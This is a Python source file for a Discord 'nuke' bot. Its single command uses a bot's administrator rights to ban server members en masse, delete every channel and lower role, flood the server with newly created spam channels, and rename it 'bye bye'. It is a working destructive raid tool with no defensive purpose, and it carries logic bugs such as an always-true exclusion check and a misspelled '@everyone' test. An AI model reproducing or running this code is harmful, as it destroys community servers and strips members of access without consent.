import discord
from discord.ext import commands
import datetime
import json

with open("config/config.json") as file:
    f = json.load(file)
    
    token = f["token"]
    prefix = f["prefix"]

bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f"{bot.user.name}#{bot.user.discriminator}")

@bot.command()
async def nuke(ctx, c:str, name="", channelamount=0, *, message=""):
    guild = ctx.guild
    bot_member = guild.get_member(bot.user.id)
    aurthor = ctx.message.author

    if c == "members":
        if bot_member.guild_permissions.administrator:
            for member in guild.members:
                if member.id is not aurthor.id or bot_member.id:
                    if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                        try:
                            await member.ban(reason="D: nuked")
                            time = datetime.datetime.now().strftime("%H:%M:%S")
                            print(f"[{time}] {member.name} ({member.id}) banned")
                        except Exception as e:
                            print(e)

    elif c == "roles":
        if bot_member.guild_permissions.administrator:
            for role in guild.roles:
                if role.position < bot_member.top_role.position:
                    if role.name != "@evryone":
                        try:
                            await role.delete()
                            time = datetime.datetime.now().strftime("%H:%M:%S")
                            print(f"[{time}] {role.name} deleted")
                        except Exception as e:
                            print(e)

    elif c == "channels":
        if bot_member.guild_permissions.administrator:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    time = datetime.datetime.now().strftime("%H:%M:%S")
                    print(f"[{time}] {channel.name} deleted")
                except Exception as e:
                    print(e)

    elif c == "all":
        if bot_member.guild_permissions.administrator:
            for channel in guild.channels:
                try:
                    await channel.delete()
                    time = datetime.datetime.now().strftime("%H:%M:%S")
                    print(f"[{time}] {channel.name} delited (CHANNEL)")
                except Exception as e:
                    print(e)

            for role in guild.roles:
                if role.position < bot_member.top_role.position:
                    try:
                        if role.name != "@evryone":
                            await role.delete()
                            time = datetime.datetime.now().strftime("%H:%M:%S")
                            print(f"[{time}] {role.name} deleted (ROLE)")
                    except Exception as e:
                        print(e)

            for member in guild.members:
                if member.id is not aurthor.id or bot_member.id:
                    if discord.utils.get(guild.roles, id=bot_member.top_role.id) > discord.utils.get(guild.roles, id=member.top_role.id):
                        try:
                            await member.ban(reason="D: nuked")
                            time = datetime.datetime.now().strftime("%H:%M:%S")
                            print(f"[{time}] {member.name} ({member.id}) banned (MEMBER)")

                        except Exception as e:
                            print(e)

            print("Making all of the channels!")
            for i in range(channelamount):
                nukechannel = await guild.create_text_channel(name)
                print(f"channel {i+1}/{channelamount}")
                await nukechannel.send(message)

            await guild.edit(name="bye bye 👋")

        else:
            print("Bot needs administartor prems")
        
bot.run(token)
